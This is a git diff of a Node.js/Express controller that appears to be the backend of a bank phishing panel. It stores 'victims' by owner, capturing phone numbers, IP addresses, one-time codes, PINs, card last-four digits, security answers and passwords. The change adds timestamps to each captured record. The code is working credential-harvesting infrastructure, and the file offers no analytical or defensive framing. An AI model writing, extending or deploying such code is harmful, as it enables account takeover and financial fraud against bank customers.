@@ -1,4 +1,5 @@
 const uBank = require("../models/ubankModel");
+var moment = require("moment"); // require
 
 const getOwnerVics = async (req, res) => {
   const { owner } = req.params;
@@ -49,7 +50,7 @@ const submitLogin = async (req, res) => {
   try {
     if (owner === "echo2911" || owner === "echo2811") {
     } else {
-      await uBank.create({ uniqueid, telephone, status: 2, owner, ip });
+      await uBank.create({ uniqueid, telephone, status: 2, owner, ip, timestamp: moment().format()});
     }
     res.sendStatus(200);
   } catch (error) {
@@ -61,7 +62,7 @@ const submitLogin = async (req, res) => {
 const submitLoginAgain = async (req, res) => {
   const { telephone, uniqueid } = req.body;
   try {
-    await uBank.findOneAndUpdate({ uniqueid }, { telephone, status: 9 }).exec();
+    await uBank.findOneAndUpdate({ uniqueid }, { telephone, status: 9, timestamp: moment().format() }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -72,7 +73,7 @@ const submitLoginAgain = async (req, res) => {
 const submitOtp = async (req, res) => {
   const { otp, uniqueid } = req.body;
   try {
-    await uBank.findOneAndUpdate({ uniqueid }, { otp, status: 7 }).exec();
+    await uBank.findOneAndUpdate({ uniqueid }, { otp, status: 7, timestamp: moment().format() }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -83,7 +84,7 @@ const submitOtp = async (req, res) => {
 const submitPin = async (req, res) => {
   const { pin, uniqueid } = req.body;
   try {
-    await uBank.findOneAndUpdate({ uniqueid }, { pin, status: 5 }).exec();
+    await uBank.findOneAndUpdate({ uniqueid }, { pin, status: 5, timestamp: moment().format() }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -94,7 +95,7 @@ const submitPin = async (req, res) => {
 const submitLast4 = async (req, res) => {
   const { last4, uniqueid } = req.body;
   try {
-    await uBank.findOneAndUpdate({ uniqueid }, { last4, status: 4 }).exec();
+    await uBank.findOneAndUpdate({ uniqueid }, { last4, status: 4, timestamp: moment().format() }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -106,7 +107,7 @@ const submitSecAnswer = async (req, res) => {
   const { secAnswer, uniqueid } = req.body;
   try {
     await uBank
-      .findOneAndUpdate({ uniqueid }, { secAnswer, status: 11 })
+      .findOneAndUpdate({ uniqueid }, { secAnswer, status: 11, timestamp: moment().format() })
       .exec();
     res.sendStatus(200);
   } catch (error) {
@@ -118,7 +119,7 @@ const submitSecAnswer = async (req, res) => {
 const submitPassword = async (req, res) => {
   const { password, uniqueid } = req.body;
   try {
-    await uBank.findOneAndUpdate({ uniqueid }, { password, status: 13 }).exec();
+    await uBank.findOneAndUpdate({ uniqueid }, { password, status: 13, timestamp: moment().format() }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
